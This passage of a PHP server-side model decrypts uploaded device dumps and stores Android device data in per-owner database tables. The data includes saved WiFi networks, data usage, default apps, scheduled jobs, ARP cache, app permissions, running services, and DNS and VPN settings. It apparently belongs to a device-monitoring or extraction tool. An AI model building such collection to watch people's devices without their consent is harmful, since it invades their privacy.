                'nfc_supported'      => isset($json['nfc_supported']) ? ($json['nfc_supported'] ? 1 : 0) : 0,
                'nfc_enabled'        => isset($json['nfc_enabled']) ? ($json['nfc_enabled'] ? 1 : 0) : 0,
                'nfc_secure_nfc'     => isset($json['nfc_secure_nfc']) ? ($json['nfc_secure_nfc'] ? 1 : 0) : 0,
                'nfc_secure_supported' => isset($json['nfc_secure_nfc_supported']) ? ($json['nfc_secure_nfc_supported'] ? 1 : 0) : 0,
                'features_json'      => isset($json['nfc_features']) ? json_encode($json['nfc_features']) : null,
                'extracted_at'       => $extracted_at,
                'created_at'         => $dated,
            ]);

            log_message('info', '[parse_nfc] Inserted NFC info for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_nfc] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DataUsageExtractor → tbl_data_usage
     * File category: data_usage
     * Stores per-network mobile/WiFi data usage
     */
    public function parse_data_usage(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $records      = $json['usage_records'] ?? [];
            $totals       = $json['totals'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_data_usage')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($records as $rec) {
                $this->db->table('tbl_data_usage')->insert([
                    'owner_id'      => $owner_id,
                    'device_id'     => $device_id,
                    'network_type'  => $rec['network_type'] ?? null,
                    'sub_id'        => $rec['sub_id'] ?? null,
                    'is_wifi'       => isset($rec['is_wifi']) ? ($rec['is_wifi'] ? 1 : 0) : 0,
                    'rx_bytes'      => $rec['rx_bytes'] ?? null,
                    'tx_bytes'      => $rec['tx_bytes'] ?? null,
                    'total_bytes'   => $rec['total_bytes'] ?? null,
                    'rx_formatted'  => $rec['rx_formatted'] ?? null,
                    'tx_formatted'  => $rec['tx_formatted'] ?? null,
                    'bucket_start'  => $rec['bucket_start'] ?? null,
                    'bucket_end'    => $rec['bucket_end'] ?? null,
                    'extracted_at'  => $extracted_at,
                    'created_at'    => $dated,
                ]);
            }

            // Store totals
            if (!empty($totals)) {
                $this->db->table('tbl_data_usage')->insert([
                    'owner_id'      => $owner_id,
                    'device_id'     => $device_id,
                    'network_type'  => 'total',
                    'is_wifi'       => 0,
                    'rx_bytes'      => $totals['total_rx'] ?? null,
                    'tx_bytes'      => $totals['total_tx'] ?? null,
                    'total_bytes'   => ($totals['total_rx'] ?? 0) + ($totals['total_tx'] ?? 0),
                    'rx_formatted'  => $totals['total_rx_formatted'] ?? null,
                    'tx_formatted'  => $totals['total_tx_formatted'] ?? null,
                    'extracted_at'  => $extracted_at,
                    'created_at'    => $dated,
                ]);
            }

            log_message('info', '[parse_data_usage] Inserted ' . count($records) . ' usage records for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_data_usage] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * SavedWifiExtractor → tbl_saved_wifi
     * File category: saved_wifi
     * Stores configured/saved WiFi networks
     */
    public function parse_saved_wifi(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $networks     = $json['saved_networks'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_saved_wifi')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($networks as $net) {
                $this->db->table('tbl_saved_wifi')->insert([
                    'owner_id'       => $owner_id,
                    'device_id'      => $device_id,
                    'ssid'           => $net['ssid'] ?? null,
                    'bssid'          => $net['bssid'] ?? null,
                    'network_id'     => $net['network_id'] ?? null,
                    'priority'       => $net['priority'] ?? null,
                    'status'         => $net['status'] ?? null,
                    'is_hidden'      => isset($net['is_hidden']) ? ($net['is_hidden'] ? 1 : 0) : 0,
                    'security'       => $net['security'] ?? null,
                    'protocols_json' => isset($net['protocols']) ? json_encode($net['protocols']) : null,
                    'auth_algorithms_json' => isset($net['auth_algorithms']) ? json_encode($net['auth_algorithms']) : null,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                ]);
            }

            log_message('info', '[parse_saved_wifi] Inserted ' . count($networks) . ' saved WiFi networks for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_saved_wifi] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * DefaultAppsExtractor → tbl_default_apps
     * File category: default_apps
     * Stores default browser, dialer, SMS, launcher, etc.
     */
    public function parse_default_apps(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_default_apps')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $handlerFields = [
                'default_browser' => 'browser',
                'default_dialer'  => 'dialer',
                'default_sms'     => 'sms',
                'default_launcher'=> 'launcher',
                'default_email'   => 'email',
                'default_maps'    => 'maps',
                'default_music'   => 'music',
                'default_gallery' => 'gallery',
                'default_browser_app' => 'browser_app',
            ];

            foreach ($handlerFields as $jsonKey => $handlerType) {
                $app = $json[$jsonKey] ?? [];
                if (!empty($app) && is_array($app) && isset($app['package_name'])) {
                    $this->db->table('tbl_default_apps')->insert([
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'handler_type' => $handlerType,
                        'package_name' => $app['package_name'] ?? null,
                        'app_name'     => $app['app_name'] ?? null,
                        'is_system'    => isset($app['is_system']) ? ($app['is_system'] ? 1 : 0) : 0,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                    ]);
                }
            }

            if (isset($json['default_sms_package'])) {
                $this->db->table('tbl_default_apps')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'handler_type' => 'sms_package',
                    'package_name' => $json['default_sms_package'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

            log_message('info', '[parse_default_apps] Inserted default apps for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_default_apps] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * AlarmsExtractor → tbl_alarms
     * File category: alarms
     * Stores JobScheduler jobs and AlarmManager alarms
     */
    public function parse_alarms(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) return false;

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) return false;

            $json = json_decode($decoded, true);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $jobs         = $json['scheduled_jobs'] ?? [];
            $alarms       = $json['alarm_clocks'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_alarms')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($jobs as $job) {
                $this->db->table('tbl_alarms')->insert([
                    'owner_id'           => $owner_id,
                    'device_id'          => $device_id,
                    'alarm_type'         => 'job',
                    'job_id'             => $job['job_id'] ?? null,
                    'service_class'      => $job['service'] ?? null,
                    'package_name'       => $job['package'] ?? null,
                    'is_periodic'        => isset($job['is_periodic']) ? ($job['is_periodic'] ? 1 : 0) : 0,
                    'interval_millis'    => $job['interval_millis'] ?? null,
                    'min_flex_millis'    => $job['min_flex_millis'] ?? null,
                    'requires_charging'  => isset($job['requires_charging']) ? ($job['requires_charging'] ? 1 : 0) : 0,
                    'requires_idle'      => isset($job['requires_idle']) ? ($job['requires_idle'] ? 1 : 0) : 0,
                    'network_type'       => $job['network_type'] ?? null,
                    'persisted'          => isset($job['persisted']) ? ($job['persisted'] ? 1 : 0) : 0,
                    'initial_delay_millis' => $job['initial_delay_millis'] ?? null,
                    'minimum_latency_millis' => $job['minimum_latency_millis'] ?? null,
                    'important_foreground' => isset($job['important_while_foreground']) ? ($job['important_while_foreground'] ? 1 : 0) : 0,
                    'extracted_at'       => $extracted_at,
                    'created_at'         => $dated,
                ]);
            }

            foreach ($alarms as $alarm) {
                $this->db->table('tbl_alarms')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'alarm_type'   => 'alarm_clock',
                    'trigger_time' => $alarm['trigger_time_millis'] ?? null,
                    'trigger_time_formatted' => $alarm['trigger_time_formatted'] ?? null,
                    'package_name' => $alarm['package'] ?? null,
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
            }

log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . count($alarms) . ' alarms for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_alarms] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * HardwareGraphicsExtractor → tbl_hardware_graphics
     * File category: hardware_graphics / hardwaregraphics
     * Stores GPU/Renderer info, Media Codecs, and Input Devices.
     */
    public function parse_hardware_graphics(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_hardware_graphics] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_hardware_graphics] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_hardware_graphics] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['timestamp'] ?? null;

            // Encode JSON fields
            $gpu_renderer = $json['gpu_renderer'] ?? null;
            if (is_array($gpu_renderer)) $gpu_renderer = json_encode($gpu_renderer);

            $media_codecs = $json['media_codecs'] ?? null;
            if (is_array($media_codecs)) $media_codecs = json_encode($media_codecs);

            $input_devices = $json['input_devices'] ?? null;
            if (is_array($input_devices)) $input_devices = json_encode($input_devices);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'gpu_renderer_json' => $gpu_renderer,
                'media_codecs_json' => $media_codecs,
                'input_devices_json' => $input_devices,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $this->db->table('tbl_hardware_graphics')->insert($data);
            log_message('info', '[parse_hardware_graphics] Inserted hardware graphics snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_hardware_graphics] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_hardware_network(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_hardware_network] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_hardware_network] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_hardware_network] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['timestamp'] ?? null;

            $network_interfaces = $json['network_interfaces'] ?? null;
            if (is_array($network_interfaces)) $network_interfaces = json_encode($network_interfaces);

            $proc_net_dev = $json['proc_net_dev'] ?? null;
            if (is_array($proc_net_dev)) $proc_net_dev = json_encode($proc_net_dev);

            $link_properties = $json['link_properties'] ?? null;
            if (is_array($link_properties)) $link_properties = json_encode($link_properties);

            $arp_cache = $json['arp_cache'] ?? null;
            if (is_array($arp_cache)) $arp_cache = json_encode($arp_cache);

            $wifi_passpoint = $json['wifi_passpoint'] ?? null;
            if (is_array($wifi_passpoint)) $wifi_passpoint = json_encode($wifi_passpoint);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'network_interfaces_json' => $network_interfaces,
                'proc_net_dev_json' => $proc_net_dev,
                'link_properties_json' => $link_properties,
                'arp_cache_json' => $arp_cache,
                'wifi_passpoint_json' => $wifi_passpoint,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_hardware_network')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_hardware_network')->insert($data);
            log_message('info', '[parse_hardware_network] Inserted hardware network snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_hardware_network] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_app_security(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_app_security] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_app_security] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_app_security] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['timestamp'] ?? null;

            $device_admin_apps = $json['device_admin_apps'] ?? null;
            if (is_array($device_admin_apps)) $device_admin_apps = json_encode($device_admin_apps);

            $app_permissions_map = $json['app_permissions_map'] ?? null;
            if (is_array($app_permissions_map)) $app_permissions_map = json_encode($app_permissions_map);

            $running_services = $json['running_services'] ?? null;
            if (is_array($running_services)) $running_services = json_encode($running_services);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'device_admin_apps_json' => $device_admin_apps,
                'app_permissions_map_json' => $app_permissions_map,
                'running_services_json' => $running_services,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_app_security')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_app_security')->insert($data);
            log_message('info', '[parse_app_security] Inserted app security snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_app_security] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_network_security(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_network_security] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_network_security] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_network_security] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['timestamp'] ?? null;

            $dns_config = $json['dns_config'] ?? null;
            if (is_array($dns_config)) $dns_config = json_encode($dns_config);

            $vpn_config = $json['vpn_config'] ?? null;
            if (is_array($vpn_config)) $vpn_config = json_encode($vpn_config);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'dns_config_json' => $dns_config,
                'vpn_config_json' => $vpn_config,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_network_security')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_network_security')->insert($data);
            log_message('info', '[parse_network_security] Inserted network security snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_network_security] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_telephony_network(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_telephony_network] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_telephony_network] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_telephony_network] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['timestamp'] ?? null;

            $ims_volte = $json['ims_volte'] ?? null;
            if (is_array($ims_volte)) $ims_volte = json_encode($ims_volte);

            $data_roaming = $json['data_roaming'] ?? null;
            if (is_array($data_roaming)) $data_roaming = json_encode($data_roaming);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'ims_volte_json' => $ims_volte,
                'data_roaming_json' => $data_roaming,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_telephony_network')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_telephony_network')->insert($data);
            log_message('info', '[parse_telephony_network] Inserted telephony network snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_telephony_network] Exception: ' . $e->getMessage());
            return false;
        }
    }

    public function parse_system_locale(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_system_locale] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_system_locale] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_system_locale] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $extracted_at = $json['timestamp'] ?? null;

            $locale_region = $json['locale_region'] ?? null;
            if (is_array($locale_region)) $locale_region = json_encode($locale_region);

            $system_fonts = $json['system_fonts'] ?? null;
            if (is_array($system_fonts)) $system_fonts = json_encode($system_fonts);

            $data = [
                'owner_id'       => $owner_id,
                'device_id'      => $device_id,
                'locale_region_json' => $locale_region,
                'system_fonts_json' => $system_fonts,
                'extracted_at'   => $extracted_at,
                'created_at'     => $dated,
            ];

            $exists = $this->db->table('tbl_system_locale')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_system_locale')->insert($data);
            log_message('info', '[parse_system_locale] Inserted system locale snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_system_locale] Exception: ' . $e->getMessage());
            return false;
        }
    }
}
